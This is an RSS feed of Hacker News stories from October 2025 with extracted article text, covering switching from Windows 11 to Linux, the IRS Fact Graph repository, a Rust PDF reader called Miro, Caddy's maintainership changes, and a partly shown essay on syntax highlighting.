<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
    <channel>
        <title>HN100 - Readable Contents</title>
        <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
        <description>Uses Readability to add bodies to the RSS feed</description>
        <lastBuildDate>Thu, 16 Oct 2025 03:30:01 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA[I'm recomming my customers switch to Linux rather that Upgrade to Windows 11 (207 pts)]]></title>
            <link>https://www.scottrlarson.com/publications/publication-windows-move-towards-surveillance/</link>
            <guid>45600338</guid>
            <pubDate>Thu, 16 Oct 2025 01:00:17 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.scottrlarson.com/publications/publication-windows-move-towards-surveillance/">https://www.scottrlarson.com/publications/publication-windows-move-towards-surveillance/</a>, See on <a href="https://news.ycombinator.com/item?id=45600338">Hacker News</a></p>
<div id="readability-page-1" class="page"><div itemprop="articleBody">
        

<p>Recently, the Secure Resilient Future Foundation released a <a href="https://fighttorepair.substack.com/p/the-windows-10-zombie-apocalypse" target="_blank">newsletter</a> calling for Microsoft to extend Windows 10 support past the October 14th deadline.</p>

<p>With the release of Windows 11, the threat to data privacy is the worst it’s ever been. In my recent article, “<a href="https://www.scottrlarson.com/publications/publication-looking-back-windows-to-linux/" target="_blank">Looking back at my transition from Windows to Linux in an anti-customer age</a>”, I wrote about my switch to Linux and how it saved me from having to sacrifice my freedom in the name of convenience.</p>

<p>Whether you’re a business or a home user, I’m here to tell you that in many cases, Linux is a real alternative to Windows. So instead of pushing the goal post back from the brink of an Orwellian nightmare. I’m suggesting all of us consider switching Linux now.</p>

<p>Microsoft’s design of Windows 11 is a concern because:</p>

<ol>
<li>Computer manufacturers, due to pressure from Microsoft, are designing new computers with artificial limitations like TPM and Secure Boot. These unnecessary add-ins push consumers to unnecessary hardware upgrades<sup id="fnref:1"><a href="#fn:1">1</a></sup>.</li>
<li>In the setup of newly purchased consumer-grade computers, there is obfuscation in the installation language. Many of the default choices are aimed at confusing customers into selecting options that share data with vendors:

<ul>
<li>The process of setting up OneDrive to act as a backup of data. Without consent, the setup of this configuration moves all customers’ data to the cloud service, re-points all the user folders to a cloud-specific OneDrive folder that’s very difficult to revert.</li>
<li>The process of selecting a browser is obfuscated by Microsoft’s Edge Browser setup</li>
</ul></li>
<li>The AI tool Co-pilot is installed and enabled without consent. Removal is difficult or nonexistent.</li>
<li>The history tracking tool “Recall” that is due to be released, sometime in the future, saves snapshots of your user experience into Microsoft’s OneDrive cloud. It looks great on paper, but in reality, this feature, along with others, will be used to move forward a surveillance state.</li>
<li>Windows 11 prevents the complete uninstall of many of its built-in features. They can be removed from one user account, but they can be reinstalled during an update, or if you upgrade your computer, without your consent.</li>
<li>Microsoft Edge is forced on users as a replacement by obfuscating choice in various ways.<br></li>
</ol>

<p>Due to these concerns, I will be recommending Linux as a replacement for new computers I build for my customers. You can still request Windows if Linux doesn’t work for you.</p>

<p>Linux Distribution Replacements for Windows
1. Zorin OS: A Windows-like Linux experience, requires modern hardware
2. PopOS: Built for gamers out of the box
3. Ubuntu: All-around desktop, requires modern hardware
4. Elementary OS: For minimalist users
5. MX Linux: For 10+ years, hardware</p>

<p>If you currently have a computer with Windows installed that you are unhappy with, <a href="https://www.scottrlarson.com/#contact">contact</a> me about migrating to Linux. It’s never been a better time for freedom in Linux.</p>

<h2 id="caveats">Caveats</h2>

<p>Linux is a different desktop environment from Windows, which requires different programs to make use of your data.  Please note that if you are a power user or a gamer, due to the way developers use vendor lock-in with their software products, certain software or games might not work, or will need to be replaced by alternatives. Below is an incomplete list of typical situations that will not work at this time. If you have any questions about these concerns, <a href="https://www.scottrlarson.com/#contact">contact</a> me to schedule a consultation to further talk about your specific use-case and the costs involved:</p>

<ul>
<li>Adobe Cloud Products - See some <a href="https://itsfoss.com/adobe-alternatives-linux/" target="_blank">alternatives</a></li>
<li>Most anti-cheat specific games</li>
<li>Microsoft Office and Outlook - Alternative for Microsoft Office: LibreOffice, Alternative for Outlook: Thunderbird (Does not handle Office 365 services very well; in this case, I suggest migrating your contacts, calendars, and email to an IMAP-hosted mail provider)</li>
<li>QuickBooks - Requires an Online Hosted alternative</li>
<li>Turbotax - Requires an Online Hosted alternative</li>
</ul>


      </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[YouTube seems to be down (132 pts)]]></title>
            <link>https://www.youtube.com/</link>
            <guid>45599669</guid>
            <pubDate>Wed, 15 Oct 2025 23:36:50 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.youtube.com/">https://www.youtube.com/</a>, See on <a href="https://news.ycombinator.com/item?id=45599669">Hacker News</a></p>
&lt;Unparsable&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[IRS Open Sources its Fact Graph (193 pts)]]></title>
            <link>https://github.com/IRS-Public/fact-graph</link>
            <guid>45599567</guid>
            <pubDate>Wed, 15 Oct 2025 23:24:47 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/IRS-Public/fact-graph">https://github.com/IRS-Public/fact-graph</a>, See on <a href="https://news.ycombinator.com/item?id=45599567">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text"><p dir="auto"><h2 tabindex="-1" dir="auto">Fact Graph</h2><a id="user-content-fact-graph" aria-label="Permalink: Fact Graph" href="#fact-graph"></a></p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Legal Disclaimer: Public Repository Access</h2><a id="user-content-legal-disclaimer-public-repository-access" aria-label="Permalink: Legal Disclaimer: Public Repository Access" href="#legal-disclaimer-public-repository-access"></a></p>
<blockquote>
<p dir="auto"><strong>No Endorsement or Warranty</strong></p>
<p dir="auto">The Internal Revenue Service (IRS) does not endorse, maintain, or guarantee the accuracy, completeness, or functionality of the code in this repository.
The IRS assumes no responsibility or liability for any use of the code by external parties, including individuals, developers, or organizations.
This includes—but is not limited to—any tax consequences, computation errors, data loss, or other outcomes resulting from the use or modification of this code.</p>
<p dir="auto">Use of the code in this repository is at your own risk. Users of this repository are responsible for complying with any open source or third-party licenses.</p>
</blockquote>
<p dir="auto"><h2 tabindex="-1" dir="auto">What is the Fact Graph?</h2><a id="user-content-what-is-the-fact-graph" aria-label="Permalink: What is the Fact Graph?" href="#what-is-the-fact-graph"></a></p>
<p dir="auto">The Fact Graph is a production-ready knowledge graph for modeling, among other things, the United States Internal Revenue Code and related tax law.
It can be used in JavaScript as well as any JVM language (Java, Kotlin, Scala, Clojure, etc.).</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Onboarding and Set Up</h2><a id="user-content-onboarding-and-set-up" aria-label="Permalink: Onboarding and Set Up" href="#onboarding-and-set-up"></a></p>
<p dir="auto">See <a href="https://github.com/IRS-Public/fact-graph/blob/main/ONBOARDING.md">ONBOARDING.md</a> for environment/developer setup.</p>
<p dir="auto">See <a href="https://github.com/IRS-Public/fact-graph/blob/main/docs/fact-graph-3.1-adr.md">the Fact Graph 3.1 ADR</a> for more information about the fact graph and how it has been changed since early 2025
See <a href="https://github.com/IRS-Public/fact-graph/blob/main/docs/from-3.0-to-3.1.md">here</a> for a brief description of changes between the older versions of the Fact Graph and the current v3.1 in this repository</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Contributing</h2><a id="user-content-contributing" aria-label="Permalink: Contributing" href="#contributing"></a></p>
<p dir="auto">See <a href="https://github.com/IRS-Public/fact-graph/blob/main/CONTRIBUTING.md">CONTRIBUTING.md</a> for details.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Repository Update Frequency</h2><a id="user-content-repository-update-frequency" aria-label="Permalink: Repository Update Frequency" href="#repository-update-frequency"></a></p>
<p dir="auto">This repository is updated frequently. Development occurs in a private repository and approved changes to <code>main</code> are pushed to this repository in real-time.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Useful documentation</h2><a id="user-content-useful-documentation" aria-label="Permalink: Useful documentation" href="#useful-documentation"></a></p>
<ul dir="auto">
<li><a href="https://www.scalatest.org/" rel="nofollow">ScalaTest</a> - the testing framework we use</li>
<li><a href="https://www.scala-lang.org/api/2.12.19/scala-xml/scala/xml/" rel="nofollow">scala-xml</a> - the standard implementation of XML (don't be put off by the sparse-seeming API docs, the function definitions have very good examples)</li>
</ul>
</article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Acrobat is intrusive, slow and non-customizable (157 pts)]]></title>
            <link>https://www.vincentuden.xyz/blog/pdf-reader</link>
            <guid>45598776</guid>
            <pubDate>Wed, 15 Oct 2025 21:54:14 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.vincentuden.xyz/blog/pdf-reader">https://www.vincentuden.xyz/blog/pdf-reader</a>, See on <a href="https://news.ycombinator.com/item?id=45598776">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>  <h2 id="why">Why?</h2>
<p>Acrobat is intrusive, slow and non-customizable.</p>
<p>Of course there are alternatives, specifically bad ones.</p>
<ul>
<li>FoxIt is slow and non-customizable.</li>
<li>Chrome/Firefox kinda works as a PDF reader, but is lacking in the feature department.</li>
</ul>
<p>On linux there is (at least) one non-bad PDF reader. Zathura is amazing with the MuPDF backend. However it only works on X11/Xorg and thus Linux. I use Wayland and Windows.</p>
<h2 id="zathura-2">Zathura-2?</h2>
<p>If I could just reach parity with the features from Zathura it would be the perfect program for me. And perhaps I could even create a more approachable program for others as well.</p>
<p>Zathura is keyboard focused, featuring a modal navigation system and command line, just like in Vim. I love that, but it’s not for everyone, and it’s not even always for me depending on what I’m doing. Mouse controls are great, when they are optional.</p>
<p>Hot reloading PDFs when they change on disk is a killer feature as well. But it can be pushed even further. What if you switch to another file in your editor? Wouldn’t it be nice if the PDF reader could switch with the editor, automatically?</p>
<p>A config for customizing key bindings is a no-brainer. It also comes with a dark-mode, not just for the interface but also for the PDF itself.</p>
<p>Last but not least, it would be nice if the PDF reader could show PDFs.</p>
<p>If I could manage to implement this rather small set of features, where the last feature is the most difficult by far. Then I could go on reading PDFs as a happier man than before.</p>
<h2 id="pdf-rasterisation">PDF rasterisation</h2>
<p>I read somewhere once that problems should always be tackled in the order from most to least difficult if you’re serious about solving them. Makes enough sense to me. Climb the mountain first and coast downhill afterwards, ticking off features with increasing speed and decreasing effort as you grow tired of the project.</p>
<p>Parsing the gigantic PDF specification and transforming decades worth of revisions into a bunch of pixels is certainly that most difficult task.</p>
<p>Fortunately, this herculean task has already been tackled by others. Once again I took inspiration from Zathura. It has a backend for rendering which uses <a href="https://mupdf.com/">MuPDF</a> for rasterisation and other PDF-parsing uses. Since I already enjoyed the performance and look of PDFs in Zathura, I might as well base my solution on the same set of giant shoulders.</p>
<p>The <a href="https://mupdf.readthedocs.io/en/latest/reference/c/index.html">official documentation</a> is pretty good, if you already understand how MuPDF works and just needs to refresh your memory on the API. But when you are just starting to dip your toes into this massive library, some additional structure is greatly appreciated. For this purpose, I read parts of <a href="https://casper.mupdf.com/docs/mupdf_explored.pdf">MuPDF Explored</a>, an online-book by <a href="https://pdfa.org/people/robin-watts/">Robin Watts</a>.</p>
<p>If rasterising PDFs is a passion of yours, I highly recommend the book. It contains everything from the simplest of PDF-to-PNG examples, to cached workflows that achieve hundreds of renders per second.</p>
<h2 id="user-interface">User interface</h2>
<p>Writing a cross-platform native GUI has always seemed way harder than it has any right to be. On one hand you have the giants, Qt and GTK which expose enormous API surfaces and might require several books of their own to understand properly. Not to mention <em>interesting</em> licensing in the case of Qt.</p>
<p>One the other hand you have the Raylib/OpenGL/etc. style of creating user interfaces. Nothing is included, if it is, it isn’t customizable at all.</p>
<p>Usually, I am quite partial to the second approach. This time however, I wanted to find something in between the extremes. After rummaging through everything from <em>Slint</em> to <em>Dear Imgui</em> I finally settled on giving <a href="https://iced.rs/">iced</a> a shot. As mentioned in <a href="https://www.vincentuden.xyz/blog/pcb_management">Open source bom management</a>, I have actually used iced before for smaller programs. Now it was time for something more complex.</p>
<p>Design-wise, there isn’t a whole lot to mention. I settled on a pretty standard layout of a main window with a sidebar containing bookmarks and a document outline.</p>
<p><img alt="A screenshot of the PDF reader" loading="lazy" decoding="async" fetchpriority="auto" sizes="(min-width: 1024px) 1024px, 100vw" data-astro-image="constrained" width="1024" height="768" src="https://www.vincentuden.xyz/_astro/miro.BRlS3Rfq_1fj9Uw.webp" srcset="https://www.vincentuden.xyz/_astro/miro.BRlS3Rfq_1aVF6T.webp 640w, https://www.vincentuden.xyz/_astro/miro.BRlS3Rfq_Z21XU9d.webp 750w, https://www.vincentuden.xyz/_astro/miro.BRlS3Rfq_Z2unSH3.webp 828w, https://www.vincentuden.xyz/_astro/miro.BRlS3Rfq_1fj9Uw.webp 1024w"></p>
<p>The interface can of course turn dark. And so can the PDF!</p>
<p><img alt="A screenshot of the PDF reader" loading="lazy" decoding="async" fetchpriority="auto" sizes="(min-width: 1024px) 1024px, 100vw" data-astro-image="constrained" width="1024" height="768" src="https://www.vincentuden.xyz/_astro/miro_dark.DNGOf0HQ_Z1EnQTs.webp" srcset="https://www.vincentuden.xyz/_astro/miro_dark.DNGOf0HQ_Z1eBlwU.webp 640w, https://www.vincentuden.xyz/_astro/miro_dark.DNGOf0HQ_ZSsIC7.webp 750w, https://www.vincentuden.xyz/_astro/miro_dark.DNGOf0HQ_ZGwKqq.webp 828w, https://www.vincentuden.xyz/_astro/miro_dark.DNGOf0HQ_Z1EnQTs.webp 1024w"></p>
<h2 id="performance">Performance</h2>
<p>In the grand scheme of things, I’m very happy with the performance of the reader. Specifically I like that it is fast enough to be <em>simple</em>. As mentioned by the likes of <a href="https://www.youtube.com/watch?v=_9_bK_WjuYY">Ryan Fleury</a> and <a href="https://www.youtube.com/watch?v=bUOOaXf9qIM">Vjekoslav Krajačić</a> among many other: <em>speed is a feature in itself</em>.</p>
<p>Zathura with the muPDF backend is unable to zoom smoothly while maintaining a clear rasterisation of the PDF. It zooms optimistically by upscaling the current bitmap which results in a pop-in a fraction of a second later when a crisp rendition replaces the blurred one.</p>
<p><a href="https://github.com/vincent-uden/miro">Miro</a> on the other hand leverages a feature called <code>DisplayList</code> to cache some data internally in muPDF to achieve several hundred, crisp renders per second if needed.</p>
<p>Before discovering <code>DisplayList</code>s, I had a complex and multi threaded system that rendered the PDF in tiles. This was awful to work with. Bugs arose from the asynchronous nature of rendering on a background thread and pixel-perfect rendering was near impossible to get right at tile borders.</p>
<p>Optimizing and probing mupdf for more advanced features led me to a simple solution, over a thousand lines of code shorter than the multi-threaded solution.</p>
<p>The only point where my PDF reader struggles is on pages using embedded svgs (or other PDFs) with several thousand entities contained, such as un-optimized graphs in scientific papers. I would love to resolve this some day.</p>
<h2 id="configuration">Configuration</h2>
<p>To me, basic configuration is a must-have for any program I use. As long as I can change the keybindings of common features I’m happy.</p>
<p>Since a PDF <strong>reader</strong> doesn’t imply any editing I could avoid implementing a modal keybinding system. Miro uses a simple config file:</p>
<pre tabindex="0" data-language="plaintext"><code><span><span># Vim-like movement keys</span></span>
<span><span>Bind j      MoveDown</span></span>
<span><span>Bind k      MoveUp</span></span>
<span><span>Bind h      MoveLeft</span></span>
<span><span>Bind l      MoveRight</span></span>
<span><span>Bind J      NextPage</span></span>
<span><span>Bind K      PreviousPage</span></span>
<span><span>Bind H      PreviousTab</span></span>
<span><span>Bind L      NextTab</span></span>
<span><span></span></span>
<span><span># ...</span></span>
<span><span></span></span>
<span><span># RPC server settings</span></span>
<span><span>Set Rpc False</span></span>
<span><span>Set RpcPort 7890</span></span>
<span><span></span></span>
<span><span># Display scaling factor for high-DPI displays</span></span>
<span><span># Use 1.0 for normal displays, 1.5 for 150% scaling, 2.0 for 200% scaling, etc.</span></span>
<span><span>Set ScaleFactor 1.0</span></span></code></pre>
<p>In fact the default bindings are bound via a <code>default.conf</code>, not hard-coded in the source code.</p>
<h2 id="remote-procedure-calls">Remote procedure calls</h2>
<p>Like Zathura, Miro automatically watches all open PDF files to reload them as soon as they change on disk. However we can take that one step further.</p>
<p>If enabled in the config file, Miro can run a server in the background which listens for remote calls from other programs. The RPC server can open PDFs, close them and toggle the dark mode. In the future it could also allow for switching pages.</p>
<p>This implies a possible coupling between your preferred editor (for example Neovim) and the PDF reader. Perhaps you’d want to sync the light/dark color scheme between your editor or desktop environment and Miro. Or you could auto-open PDF files as soon as they are opened in the editor.</p>
<p>Instead of trying to implement a Latex, Typst or Markdown editor, this approach allows for the integrated editing and preview environment you’re used to from web development but for any sort of file that is possible to compile to PDF.</p>
<h2 id="where-do-i-get-it">Where do I get it?</h2>
<p>Do you want to compile from source?</p>
<pre tabindex="0" data-language="sh"><code><span><span>cargo</span><span> install</span><span> miro-pdf</span></span></code></pre>
<p>Are you fine with a pre-compiled binary, are on Windows (compiling this sucks on Windows) or prefer a faster install?</p>
<pre tabindex="0" data-language="sh"><code><span><span>cargo</span><span> binstall</span><span> miro-pdf</span></span></code></pre>
<p>Do you want a pre-compiled binary but don’t have cargo installed? Check out the <a href="https://github.com/vincent-uden/miro/releases">release page</a>.</p>
<p>Want to check out the source code or report an issue? Check out the project on <a href="https://github.com/vincent-uden/miro">Github</a>.</p>
<h2 id="concluding-thoughts">Concluding thoughts</h2>
<p>I am not done with this project, eventually I want to entirely replace the UI layer with a home-cooked GUI library I am working on. Additionally I’d love some light editing features, such as comments or annotations.</p>
<p>Still, I am very satisfied with the outcome. This is my current, best attempt at bringing the Unix philosophy to the process of writing documents that compile to PDFs. Finally I have the reader that fills my needs.</p>  </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Next Steps for the Caddy Project Maintainership (125 pts)]]></title>
            <link>https://caddy.community/t/next-steps-for-the-caddy-project-maintainership/33076</link>
            <guid>45598590</guid>
            <pubDate>Wed, 15 Oct 2025 21:32:19 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://caddy.community/t/next-steps-for-the-caddy-project-maintainership/33076">https://caddy.community/t/next-steps-for-the-caddy-project-maintainership/33076</a>, See on <a href="https://news.ycombinator.com/item?id=45598590">Hacker News</a></p>
<div id="readability-page-1" class="page"><div itemprop="text">
              <p><strong>tldr:</strong> I won’t personally see <em>all</em> comments/issues/PRs anymore; maintainer team is being granted tag+release privileges; community will be more involved with leadership; increase current bus factor of 1; unblock the project where I am the bottleneck; help the project scale better.</p>
<hr>
<p>Caddy is now about 11 years old, and the project has changed a lot over that time, and grown hugely popular! To shed some perspective…</p>
<h2><a name="p-106854-what-it-used-to-be-like-1" href="#p-106854-what-it-used-to-be-like-1"></a>What it used to be like</h2>
<p>For years, my daily-ish routine involved checking my GitHub notifications – usually around 1-3 – triaging them and responding to each one of them personally. Most issues were obvious: bugs that needed urgent fixing, features that were a clear yes/no for the project, or questions that had easy answers.</p>
<p>Even after the launch of v2, the project was still new and developing, most other people didn’t have a lot of experience with it, and my vision was clear, so it was pretty easy to answer questions, make decisions, review the trickle of pull requests, etc. I wrote most of the code and was familiar with it.</p>
<p>My notification inbox essentially became my TODO list, and it was fairly easy to keep under 1 page (or about 25 notifications). At any given time, Caddy almost never had more than 100 open issues or 25 open PRs.</p>
<p>Later, we set up a forum, which I’d check multiple times per day and reply to questions there. Usually about 1-3 posts per day. No problem keeping up with it all. I read <em>every single topic</em> for years, and answered many of them myself to help educate others and be aware of user experiences, etc.</p>
<p>I tagged and published every single release. Sometimes multiple per day (oops). Over 100 now.</p>
<h2><a name="p-106854-how-it-changed-over-time-2" href="#p-106854-how-it-changed-over-time-2"></a>How it changed over time</h2>
<p>As the project grew, the docs improved substantially via contributions. More nits and edge cases were covered. Examples were added (and more to come, I’m sure).</p>
<p>Knowledge began to accumulate in the community, meaning that people could answer more questions by search results, and help others find answers to their questions, which tended to grow more niche since the general questions were answered. (This is precisely the outcome I’d hoped for over years with a public forum.)</p>
<p>You may recognize some of these people who stuck around as they gained experience, and have helped others in our community and with code maintenance (in no particular order): <a href="https://caddy.community/u/whitestrake">@Whitestrake</a> , <a href="https://caddy.community/u/francislavoie">@francislavoie</a> , <a href="https://caddy.community/u/elcore">@elcore</a> , <a href="https://caddy.community/u/abiosoft">@abiosoft</a> , <a href="https://caddy.community/u/mohammed90">@Mohammed90</a> , <a href="https://caddy.community/u/weidideng">@WeidiDeng</a> , <a href="https://caddy.community/u/tobya">@tobya</a> , <a href="https://caddy.community/u/timelordx">@timelordx</a> , <a href="https://caddy.community/u/elee">@elee</a> , <a href="https://caddy.community/u/hairyhenderson">@hairyhenderson</a> , and many others who have contributed their time and skills to help out. I am very appreciative! As are thousands of lurkers. <img src="https://caddy.community/images/emoji/apple/slight_smile.png?v=14" title=":slight_smile:" alt=":slight_smile:" loading="lazy" width="20" height="20"></p>
<h2><a name="p-106854-what-its-like-now-3" href="#p-106854-what-its-like-now-3"></a>What it’s like now</h2>
<p>Forum activity is up about 2-5x. Where we used to get 1 topic per day, sometimes it’s up to 10 (it fluctuates, but the average is about 3-5). And posts average around 5-15. It can be higher when there’s people actively helping answer questions. This is not huge, but it’s a lot for just myself and our little community. Our forum gets about 50,000 page views per day!</p>
<p>Many of the questions now are either so niche that I don’t have the skills/expertise to answer them (many, many questions are less about Caddy specifically these days, and more about external system configurations, third-party software integrations, etc.), OR they are trivial/routine enough that others who have a bit of experience can easily answer them (i.e. I don’t have to be the one to respond, since the knowledge is shared by many now).</p>
<p>On GitHub, my notification inbox is almost out of control: I have just under 200 in the inbox, or about 8 pages – and that’s my TODO list that I work through each day. Caddy has almost 200 open issues and over 50 open PRs. I wake up to about 10-25 new notifications per day now, instead of 1-3. Again, this is still quite good for a project of our size, but it’s more than just the backlog…</p>
<p>The issues are also more obscure and less obvious. For example, bugs used to be pretty obvious and easy to reproduce. Most could be fixed in a few minutes or a day. Now, the project is so stable and mature that most bugs require extensive explaining and troubleshooting, and very specific configurations, to reproduce. Many are related to subtle interactions with the Go standard library or upstream dependencies, or even OS kernels. They take longer, and require more specific expertise, than <em>Ye Olde Bugs of Yore</em>. And most of them are very edge-casey anyway. Few people hit these bugs, and rarely. (This is right where we want to be!) Special thank-you to <a href="https://caddy.community/u/weidideng">@WeidiDeng</a> for taking care of so many transport-related issues (weird quirks with different HTTP versions), and <a href="https://caddy.community/u/hairyhenderson">@hairyhenderson</a> with metrics, and <a href="https://caddy.community/u/mohammed90">@Mohammed90</a> for CI issues, and <a href="https://caddy.community/u/francislavoie">@francislavoie</a> for a lot of the Caddyfile and config things. I cannot imagine having to figure out all that stuff myself.</p>
<p>Feature requests are also more nuanced than before. Caddy 2 has more or less achieved my vision of the web server I started in 2014. To clarify, it’s not <em>done</em>… there is plenty more to do; we will continue to evolve and adapt the project to a changing Internet landscape. But many of the big and obvious features have mostly shipped. And the plugin architecture is powerful enough that nearly all new features can be implemented as separate plugins before being added to our code base. (Plugins can be added to our repository, but these days most need to be proven outside of it first.)</p>
<p>All this means that I have started falling behind, for the last couple years, to personally keep up with every single:</p>
<ul>
<li>Comment</li>
<li>New issue</li>
<li>New PR</li>
<li>Code review</li>
<li>Requested review</li>
<li>Dependency update</li>
<li>Forum topic</li>
<li>Forum reply</li>
</ul>
<p>in the Caddy org on GitHub, and these forums. I can’t close issues, answer questions, and merge PRs as quickly and easily now because the nature of their complexity is changing. I have started to become a bottleneck in the project’s growth and development.</p>
<h2><a name="p-106854-next-steps-4" href="#p-106854-next-steps-4"></a>Next steps</h2>
<p>The stress of such a huge and growing backlog – combined with the increasing nuance/specificity of issues, feature requests, and questions – has strained my mental health and work habits, and added strain on my family life. So after talking with my wise and wonderful wife, I am making the decision to turn off most notifications on GitHub and the forum, so that I can prioritize work that only I can do (or am the most qualified to do), and my family.</p>
<p>In other words, new activity of all kinds (listed above <img src="https://caddy.community/images/emoji/apple/point_up.png?v=14" title=":point_up:" alt=":point_up:" loading="lazy" width="20" height="20">) won’t <em>automatically</em> add itself to my TODO list. I won’t see <em>every</em> comment and issue like I do today. I don’t need to, either, it’s kind of getting bad for my mental health to try to keep track of the <em>hundreds</em> of discussions.</p>
<p>To clarify, I’ll still be very actively engaged with the project. I’ll still be notified of specific events, and I will still be checking GitHub and the forums ~daily, and replying to issues and questions as I have time for them.</p>
<p>I will also be clearing out my existing TODO list. It will be manually curated instead. 200 issues in my backlog… that’s a disservice to everyone who is contributing. You’ll get lost in there. It’s time for me to let the community take another step up as a mature project.</p>
<p>All this time, I have been the only one with the key to tag and publish releases. I will be granting privileges to our maintainer team to tag new releases going forward. Any new release should require approval from at least 2 maintainers.</p>
<p>We’ll also be looking to grow our maintainer team. The best way to join is to start reviewing PRs and submit patches for reported bugs. You can also help improve our documentation/website, help with CI/dependencies, etc. We’ll send out maintainer invites to people who show consistent patterns of making valuable contributions and an understanding of our project’s values.</p>
<p>We may also add more collaborators to the project, to help get PRs merged, but with less privileges than maintainers. Again, to be invited, get involved and demonstrate patterns of valuable contributions.</p>
<p>A consensus from the maintainer team will be sufficient to add new maintainers and collaborators, and two or more can remove those who are inactive for an extended period of time. We’ll strive to enforce best security practices when it comes to access to the project. (We already require 2FA, for example.)</p>
<p>This should help increase the current bus factor of 1, and unblock the project where I’ve been the bottleneck. And lower my stress and improve my mental health and ability to deliver quality work.</p>
<h2><a name="p-106854-big-thank-you-5" href="#p-106854-big-thank-you-5"></a>Big thank you</h2>
<p>Huge thank you to everyone who contributes and helps in any way – we value your participation, and hope you will continue to do so, and if interested, become a collaborator or maintainer with our project!</p>
<p>Also, the only reason this project has survived so long is because of our sponsors – thank you for making it what it is! Without you I would have had to pack up shop years ago and let the project kind of… I dunno, mold? Whatever stale open source projects do. So thank you for continuing to sponsor. I look forward to continuing to serve and support you for years to come.</p>
            </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Getting syntax highlighting wrong (173 pts)]]></title>
            <link>https://tonsky.me/blog/syntax-highlighting/</link>
            <guid>45596960</guid>
            <pubDate>Wed, 15 Oct 2025 18:59:54 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://tonsky.me/blog/syntax-highlighting/">https://tonsky.me/blog/syntax-highlighting/</a>, See on <a href="https://news.ycombinator.com/item?id=45596960">Hacker News</a></p>
<div id="readability-page-1" class="page"><article>
        
        <p>Syntax highlighting is a tool. It can help you read code faster. Find things quicker. Orient yourself in a large file.</p>
        <p>Like any tool, it can be used correctly or incorrectly. Let’s see how to use syntax highlighting to help you work.</p>
        <h2 id="christmas-lights-diarrhea">Christmas Lights Diarrhea</h2>
        <p>Most color themes have a unique bright color for literally everything: one for variables, another for language keywords, constants, punctuation, functions, classes, calls, comments, etc.</p>
        <p>Sometimes it gets so bad one can’t see the base text color: everything is highlighted. What’s the base text color here?</p>
        <figure>
<img src="https://tonsky.me/blog/syntax-highlighting/diarrhea.webp?t=1760553996" width="720" height="653">        </figure>
        <p>The problem with that is, if everything is highlighted, nothing stands out. Your eye adapts and considers it a new norm: everything is bright and shiny, and instead of getting separated, it all blends together.</p>
        <p>Here’s a quick test. Try to find the function definition here:</p>
        <figure>
<img src="https://tonsky.me/blog/syntax-highlighting/definitions_bad.webp?t=1760553996" width="720" height="653">        </figure>
        <p>and here:</p>
        <figure>
<img src="https://tonsky.me/blog/syntax-highlighting/definitions_good.webp?t=1760553996" width="720" height="653">        </figure>
        <p>See what I mean?</p>
        <p>So yeah, unfortunately, you can’t just highlight everything. You have to make decisions: what is more important, what is less. What should stand out, what shouldn’t.</p>
        <p>Highlighting everything is like assigning “top priority” to every task in Linear. It only works if most of the tasks have lesser priorities.</p>
        <p>If everything is highlighted, nothing is highlighted.</p>
        <h2 id="enough-colors-to-remember">Enough colors to remember</h2>
        <p>There are two main use-cases you want your color theme to address:</p>
        <ol start="1">
          <li>Look at something and tell what it is by its color (you can tell by reading text, yes, but why do you need syntax highlighting then?)</li>
          <li>Search for something. You want to know what to look for (which color).</li>
        </ol>
        <p>1 is a direct index lookup: color → type of thing.</p>
        <p>2 is a reverse lookup: type of thing → color.</p>
        <p>Truth is, most people don’t do these lookups at all. They might think they do, but in reality, they don’t.</p>
        <p>Let me illustrate. Before:</p>
        <figure>
<img src="https://tonsky.me/blog/syntax-highlighting/change_before.webp?t=1760553996" width="720" height="350">        </figure>
        <p>After:</p>
        <figure>
<img src="https://tonsky.me/blog/syntax-highlighting/change_after.webp?t=1760553996" width="720" height="350">        </figure>
        <p>Can you see it? I misspelled <code>return</code> for <code>retunr</code> and its color switched from red to purple.</p>
        <p>I can’t.</p>
        <p>Here’s another test. Close your eyes (not yet! Finish this sentence first) and try to remember what color your color theme uses for class names?</p>
        <p>Can you?</p>
        <p>If the answer for both questions is “no”, then your color theme is <em>not functional</em>. It might give you comfort (as in—I feel safe. If it’s highlighted, it’s probably code) but you can’t use it as a tool. It doesn’t <em>help</em> you.</p>
        <p>What’s the solution? Have an absolute minimum of colors. So little that they all fit in your head at once. For example, my color theme, Alabaster, only uses four:</p>
        <ul>
          <li>Green for strings</li>
          <li>Purple for constants</li>
          <li>Yellow for comments</li>
          <li>Light blue for top-level definitions</li>
        </ul>
        <p>That’s it! And I was able to type it all from memory, too. This minimalism allows me to actually do lookups: if I’m looking for a string, I know it will be green. If I’m looking at something yellow, I know it’s a comment.</p>
        <p>Limit the number of different colors to what you can remember.</p>
        <p>If you swap green and purple in my editor, it’ll be a catastrophe. If somebody swapped colors in yours, would you even notice?</p>
        <h2 id="what-should-you-highlight">What should you highlight?</h2>
        <p>Something there isn’t a lot of. Remember—we want highlights to stand out. That’s why I don’t highlight variables or function calls—they are everywhere, your code is probably 75% variable names and function calls.</p>
        <p>I do highlight constants (numbers, strings). These are usually used more sparingly and often are reference points—a lot of logic paths start from constants.</p>
        <p>Top-level definitions are another good idea. They give you an idea of a structure quickly.</p>
